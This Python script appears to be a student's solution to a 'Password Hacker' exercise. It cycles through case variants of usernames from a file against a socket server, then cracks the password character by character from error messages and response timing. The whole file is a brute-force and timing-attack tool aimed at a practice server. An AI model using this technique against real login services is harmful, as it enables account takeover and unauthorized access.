# write your code here
from itertools import product
import itertools
import socket
import sys
import json
import time
from datetime import datetime, timedelta

args = sys.argv
ip = args[1]
port = int(args[2])
address = (ip, port)
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'


def login_gen():
    with open('C:\\Users\\Administrator\\python_projects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt',
              'r') as logins:
        for login in logins:
            upper = login.upper()
            lower = login.lower()
            zipped = zip(upper, lower)

            all_combinations = map(''.join, product(*zipped))
            for element in all_combinations:
                yield element


# a = itertools.cycle(characters)


# **global_variables**
response = {'result': ' '}
password = None
beginning = ""
login = None
going = True
message = None
delay = timedelta(seconds=0)


def main():
    global going, response, password, login, beginning, message, delay

    with socket.socket() as my_socket:
        my_socket.connect(address)
        logins = login_gen()
        chars = itertools.cycle(characters)
        while going:
            if response['result'] == "Connection success!":
                print(message.decode())
                break
            # checking if the server delays to response (use response['result'] == 'Exception...' for stage 4)
            elif delay > timedelta(seconds=0.1):
                beginning = password
                password = next(chars) + beginning
                # print(password)
            elif response['result'] == "Wrong password!":
                password = beginning + next(chars)
            # print(login)
            elif response['result'] != "Wrong password!":
                password = ' '
                login = str(next(logins).strip())
            # print(login)
            message_dict = {"login": login, "password": password}
            message_json = json.dumps(message_dict)
            message = message_json.encode()

            start = datetime.now()
            my_socket.send(message)
            response_byte = my_socket.recv(1024)
            end = datetime.now()

            # measuring the time for response from the server
            delay = end - start

            if response_byte:
                response = json.loads(response_byte.decode())


main()
